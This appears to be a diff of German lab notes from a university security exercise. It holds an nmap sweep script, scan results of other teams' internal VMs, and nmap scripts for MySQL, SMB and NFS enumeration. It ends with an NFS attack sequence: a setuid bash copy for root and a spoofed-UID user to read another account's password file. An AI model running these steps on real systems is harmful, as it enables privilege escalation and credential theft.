@@ -66,24 +66,23 @@ Insgesamt hat lynis keine Sicherheitslücken gefunden, sondern nur Empfehlungen 
 nmap ist ein Netzwerkscanner, der Netzwerke auf offene Ports, Dienste und Sicherheitslücken scannt. Wir haben mit dem folgenden Skript von vm1 all unsere VMs gescannt:
 
 ```bash
-#!/bin/bash
+#!/usr/bin/env bash
 
-# define the IP range
-ip_prefix="192.168.3."
-start=1
-end=10
+# Define the subnet to scan
+subnet="192.168.6.0/24"
 temp_file=$(mktemp)
+hosts_file=$(mktemp)
 
-echo "Scanning IP range ${ip_prefix}${start}-${end}..."
+echo "Performing host discovery on ${subnet}..."
+nmap -sn $subnet -oG - | awk '/Up$/{print $2}' > $hosts_file
 
-# loop through IP range and perform nmap scan
-for i in $(seq $start $end); do
-    ip="${ip_prefix}${i}"
+echo "Scanning live hosts for open ports..."
+while IFS= read -r ip; do
     echo "Scanning ${ip}..."
-    nmap -oG - -p 1-65535 $ip | grep -v "^#" >> $temp_file
-done
+    nmap -oG - -p 1-65535 "$ip" | grep -v "^#" >> $temp_file
+done < $hosts_file
 
-# print results
+# Print results
 echo ""
 echo "Scan Results:"
 echo "---------------------"
@@ -111,6 +110,7 @@ cat $temp_file | awk '
 }'
 
 rm $temp_file
+rm $hosts_file
 ```
 
 und folgendes Ergebnis erhalten:
@@ -135,17 +135,180 @@ team2:
 ```bash
 IP Address      Hostname                                 Open Ports (with Service)                                             
 ---------------------------------------------------------------------------------------------------------------
-192.168.2.1     (ns.psa-team02.cit.tum.de)               22/open/tcp/ssh 53/open/tcp/domain 5666/open/tcp/nrpe 8123/open/tcp/polipo 
-192.168.2.2     (vm2.psa-team02.cit.tum.de)              22/open/tcp/ssh 5666/open/tcp/nrpe 8123/open/tcp/polipo 
-192.168.2.3     (vm3.psa-team02.cit.tum.de)              22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 5666/open/tcp/nrpe 8123/open/tcp/polipo 
-192.168.2.4     (db.psa-team02.cit.tum.de)               22/open/tcp/ssh 3306/open/tcp/mysql 5666/open/tcp/nrpe 8123/open/tcp/polipo 
-192.168.2.5     (dbm.psa-team02.cit.tum.de)              22/open/tcp/ssh 3306/open/tcp/mysql 5666/open/tcp/nrpe 8123/open/tcp/polipo 
-192.168.2.6     (cloudserv.psa-team02.cit.tum.de)        22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 5666/open/tcp/nrpe 8123/open/tcp/polipo 
-192.168.2.7     (fileserver.psa-team02.cit.tum.de)       22/open/tcp/ssh 111/open/tcp/rpcbind 139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs 5666/open/tcp/nrpe 8123/open/tcp/polipo 
-192.168.2.8     (ldap.psa-team02.cit.tum.de)             22/open/tcp/ssh 389/open/tcp/ldap 636/open/tcp/ldapssl 5666/open/tcp/nrpe 8123/open/tcp/polipo 
-192.168.2.9     (mail.psa-team02.cit.tum.de)             22/open/tcp/ssh 25/open/tcp/smtp 110/open/tcp/pop3 143/open/tcp/imap 5666/open/tcp/nrpe 8123/open/tcp/polipo 
-192.168.2.10    (due.psa-team02.cit.tum.de)              22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 5666/open/tcp/nrpe 8123/open/tcp/polipo 
+192.168.2.1     (ns.psa-team02.cit.tum.de)               22/open/tcp/ssh 53/open/tcp/domain   5666/open/tcp/nrpe       8123/open/tcp/polipo 
+192.168.2.2     (vm2.psa-team02.cit.tum.de)              22/open/tcp/ssh 5666/open/tcp/nrpe   8123/open/tcp/polipo 
+192.168.2.3     (vm3.psa-team02.cit.tum.de)              22/open/tcp/ssh 80/open/tcp/http     443/open/tcp/https       5666/open/tcp/nrpe        8123/open/tcp/polipo 
+192.168.2.4     (db.psa-team02.cit.tum.de)               22/open/tcp/ssh 3306/open/tcp/mysql  5666/open/tcp/nrpe       8123/open/tcp/polipo 
+192.168.2.5     (dbm.psa-team02.cit.tum.de)              22/open/tcp/ssh 3306/open/tcp/mysql  5666/open/tcp/nrpe       8123/open/tcp/polipo 
+192.168.2.6     (cloudserv.psa-team02.cit.tum.de)        22/open/tcp/ssh 80/open/tcp/http     443/open/tcp/https       5666/open/tcp/nrpe        8123/open/tcp/polipo 
+192.168.2.7     (fileserver.psa-team02.cit.tum.de)       22/open/tcp/ssh 111/open/tcp/rpcbind 139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs     5666/open/tcp/nrpe 8123/open/tcp/polipo 
+192.168.2.8     (ldap.psa-team02.cit.tum.de)             22/open/tcp/ssh 389/open/tcp/ldap    636/open/tcp/ldapssl     5666/open/tcp/nrpe        8123/open/tcp/polipo 
+192.168.2.9     (mail.psa-team02.cit.tum.de)             22/open/tcp/ssh 25/open/tcp/smtp     110/open/tcp/pop3        143/open/tcp/imap         5666/open/tcp/nrpe    8123/open/tcp/polipo 
+192.168.2.10    (due.psa-team02.cit.tum.de)              22/open/tcp/ssh 80/open/tcp/http     443/open/tcp/https       5666/open/tcp/nrpe        8123/open/tcp/polipo 
 ```
+
+team4:
+
+```bash
+192.168.4.1     (ns.psa-team04.cit.tum.de)               22/open/tcp/ssh 53/open/tcp/domain 8123/open/tcp/polipo 
+192.168.4.3     (vm04-03.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.4.4     (vm04-04.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.4.5     (vm04-05.psa-team04.cit.tum.de)          22/open/tcp/ssh 3306/open/tcp/mysql 8123/open/tcp/polipo 
+192.168.4.6     (vm04-06.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.4.8     (vm04-08.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.4.9     (vm04-09.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.4.10    (vm04-10.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.4.11    ()                                       22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.4.12    (fileserver.psa-team04.cit.tum.de)       22/open/tcp/ssh 139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs 8123/open/tcp/polipo 
+192.168.4.13    (mail.psa-team04.cit.tum.de)             22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.4.14    ()                                       22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.4.15    ()                                       22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.4.20    (vm04-20.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.4.22    (ldap.psa-team04.cit.tum.de)             22/open/tcp/ssh 636/open/tcp/ldapssl 8123/open/tcp/polipo 
+192.168.4.43    (vm04-04-ip43.psa-team04.cit.tum.de)     22/open/tcp/ssh 8123/open/tcp/polipo 
+```
+-> no nfs share
+
+
+team5:
+
+```bash
+IP Address      Hostname                                 Open Ports (with Service)                                             
+---------------------------------------------------------------------------------------------------------------
+192.168.5.1     (vm01.psa-team05.cit.tum.de)             22/open/tcp/ssh 53/open/tcp/domain 8123/open/tcp/polipo 
+192.168.5.2     (vm02.psa-team05.cit.tum.de)             22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 8123/open/tcp/polipo 
+192.168.5.3     (vm03.psa-team05.cit.tum.de)             8123/open/tcp/polipo                                
+192.168.5.4     (vm04.psa-team05.cit.tum.de)             22/open/tcp/ssh 5432/open/tcp/postgresql 8123/open/tcp/polipo 
+192.168.5.5     (vm05.psa-team05.cit.tum.de)             22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.5.6     (vm06.psa-team05.cit.tum.de)             22/open/tcp/ssh 111/open/tcp/rpcbind 636/open/tcp/ldapssl 8123/open/tcp/polipo 9000/open/tcp/cslistener 
+192.168.5.7     (vm07.psa-team05.cit.tum.de)             22/open/tcp/ssh 111/open/tcp/rpcbind 139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs 4000/open/tcp/remoteanything 4001/open/tcp/newoak 4002/open/tcp/mlchat-proxy 8123/open/tcp/polipo 9000/open/tcp/cslistener 
+192.168.5.8     (vm08.psa-team05.cit.tum.de)             22/open/tcp/ssh 25/open/tcp/smtp 143/open/tcp/imap 8123/open/tcp/polipo 9000/open/tcp/cslistener 9154/open/tcp/ 
+192.168.5.9     ()                                       22/open/tcp/ssh 80/open/tcp/http 8123/open/tcp/polipo 
+192.168.5.200   (web.psa-team05.cit.tum.de)              22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 8123/open/tcp/polipo 
+```
+
+-> nfs on 192.168.5.7 mit /16
+
+
+team6:
+
+```bash
+P Address      Hostname                                 Open Ports (with Service)                                             
+---------------------------------------------------------------------------------------------------------------
+192.168.6.1     (shika.psa-team06.cit.tum.de)            22/open/tcp/ssh 53/open/tcp/domain 3000/open/tcp/ppp 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
+192.168.6.2     (nm2acs.netz.lrz.de)                     22/open/tcp/ssh 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
+192.168.6.3     (neko.psa-team06.cit.tum.de)             22/open/tcp/ssh 111/open/tcp/rpcbind 443/open/tcp/https 2368/open/tcp/opentable 8123/open/tcp/polipo 9100/open/tcp/jetdirect 50727/open/tcp/ 
+192.168.6.4     (alphonse.psa-team06.cit.tum.de)         22/open/tcp/ssh 3306/open/tcp/mysql 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
+192.168.6.5     (edward.psa-team06.cit.tum.de)           22/open/tcp/ssh 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
+192.168.6.6     (kumo.psa-team06.cit.tum.de)             22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
+192.168.6.7     (fileserver.psa-team06.cit.tum.de)       22/open/tcp/ssh 111/open/tcp/rpcbind 139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
+192.168.6.8     (ldap.psa-team06.cit.tum.de)             22/open/tcp/ssh 636/open/tcp/ldapssl 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
+192.168.6.9     (meiru.psa-team06.cit.tum.de)            22/open/tcp/ssh 25/open/tcp/smtp 110/open/tcp/pop3 143/open/tcp/imap 993/open/tcp/imaps 995/open/tcp/pop3s 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
+192.168.6.69    (web.psa-team06.cit.tum.de)              22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
+```
+
+-> fileserver auf 192.168.6.7 aber nicht /16 ?
+
+team7:
+
+```bash
+#nothing relevant
+```
+
+team8:
+
+```bash
+P Address      Hostname                                 Open Ports (with Service)                                             
+---------------------------------------------------------------------------------------------------------------
+192.168.8.3     (vm003.psa-team08.cit.tum.de)            22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.8.4     (vm004.psa-team08.cit.tum.de)            22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.8.5     (vm005.psa-team08.cit.tum.de)            22/open/tcp/ssh 111/open/tcp/rpcbind 8123/open/tcp/polipo 
+192.168.8.6     (ns.psa-team08.cit.tum.de)               22/open/tcp/ssh 53/open/tcp/domain 8123/open/tcp/polipo 
+192.168.8.7     (vm007.psa-team08.cit.tum.de)            22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.8.9     (vm009.psa-team08.cit.tum.de)            22/open/tcp/ssh 3306/open/tcp/mysql 8123/open/tcp/polipo 
+192.168.8.10    (vm010.psa-team08.cit.tum.de)            22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.8.11    (grafana.psa-team08.cit.tum.de)          22/open/tcp/ssh 111/open/tcp/rpcbind 443/open/tcp/https 2003/open/tcp/finger 2004/open/tcp/mailbox 2023/open/tcp/xinuexpansion3 2024/open/tcp/xinuexpansion4 3001/open/tcp/nessus 3002/open/tcp/exlm-agent 8123/open/tcp/polipo 8126/open/tcp/ 43153/open/tcp/ 
+192.168.8.12    (vm012.psa-team08.cit.tum.de)            22/open/tcp/ssh 111/open/tcp/rpcbind 445/open/tcp/microsoft-ds 2049/open/tcp/nfs 8123/open/tcp/polipo 
+192.168.8.13    (ldap.psa-team08.cit.tum.de)             22/open/tcp/ssh 636/open/tcp/ldapssl 8123/open/tcp/polipo 
+192.168.8.14    (vm014.psa-team08.cit.tum.de)            22/open/tcp/ssh 25/open/tcp/smtp 110/open/tcp/pop3 111/open/tcp/rpcbind 143/open/tcp/imap 993/open/tcp/imaps 995/open/tcp/pop3s 8123/open/tcp/polipo 
+192.168.8.15    (vm015.psa-team08.cit.tum.de)            22/open/tcp/ssh 8123/open/tcp/polipo 
+192.168.8.254   (router.psa-team08.cit.tum.de)           22/open/tcp/ssh 111/open/tcp/rpcbind 8123/open/tcp/polipo
+```
+
+-> fileserver auf 192.168.8.12 aber ohne /16?
+
+team9
+
+```bash
+
+```
+
+-> fileserver auf 192.168.9.14 aber ohne /16?
+
+
+team 10
+
+```bash
+
+```
+
+-> fileserver auf 192.168.10.8 mit /16
+
+
+##### SQL
+mysql enumeration: versucht alle Datenbanken auf einem MySQL-Server zu enumerieren
+`nmap -p 3306 --script mysql-enum.nse <target>`
+mysql-brute: versucht ob der root user mit einem leeren Passwort auf einem MySQL-Server einloggen kann
+`nmap -p 3306 --script mysql-brute.nse <target>`
+
+##### SMB
+aufzählung aller shares auf einem SMB-Server
+`nmap -p 139,445 --script smb-enum-shares.nse <target>`
+aufzählung aller Benutzer auf einem SMB-Server
+`nmap -p 139,445 --script smb-enum-users.nse <target>`
+
+##### NFS
+aufzählung aller NFS-Exporte auf einem Server
+`nmap -p 111 --script nfs-ls.nse <target>`
+show mounts
+`showmount -e <IP>`
+mounting eines NFS-Exports
+
+```bash
+mkdir -p /mnt/nfs
+mount -t nfs 192.168.5.7:/export /mnt/nfs -o nolock
+ls -la /mnt/nfs
+# -> ckeck permissions
+# find /mnt/nfs -writable
+# crontab -l
+# cp $(which bash) .
+# chmod +s bash
+# ./bash -p
+# cp bash to atten home dir -> login as atten nd execute ./bash -p -> root
+useradd -m -u 10021 -G students newuser
+passwd newuser
+umount /mnt/nfs
+mount -t nfs 192.168.5.7:/export/atten /mnt/nfs -o nolock
+su - newuser
+cd /mnt/nfs
+cat atten.password
+# check if permissions -> if yes copy bash | else at least as atten user write and read permissions
+find /mnt/nfs -writable
+```
+
+##### webserver
+
+##### mailserver
+
+##### ldap
+
+##### ssh
+
+##### webanwendung
+
+##### dns
+
+
 
 
 ### 2. Dokumentation gefundener Sicherheitslücken
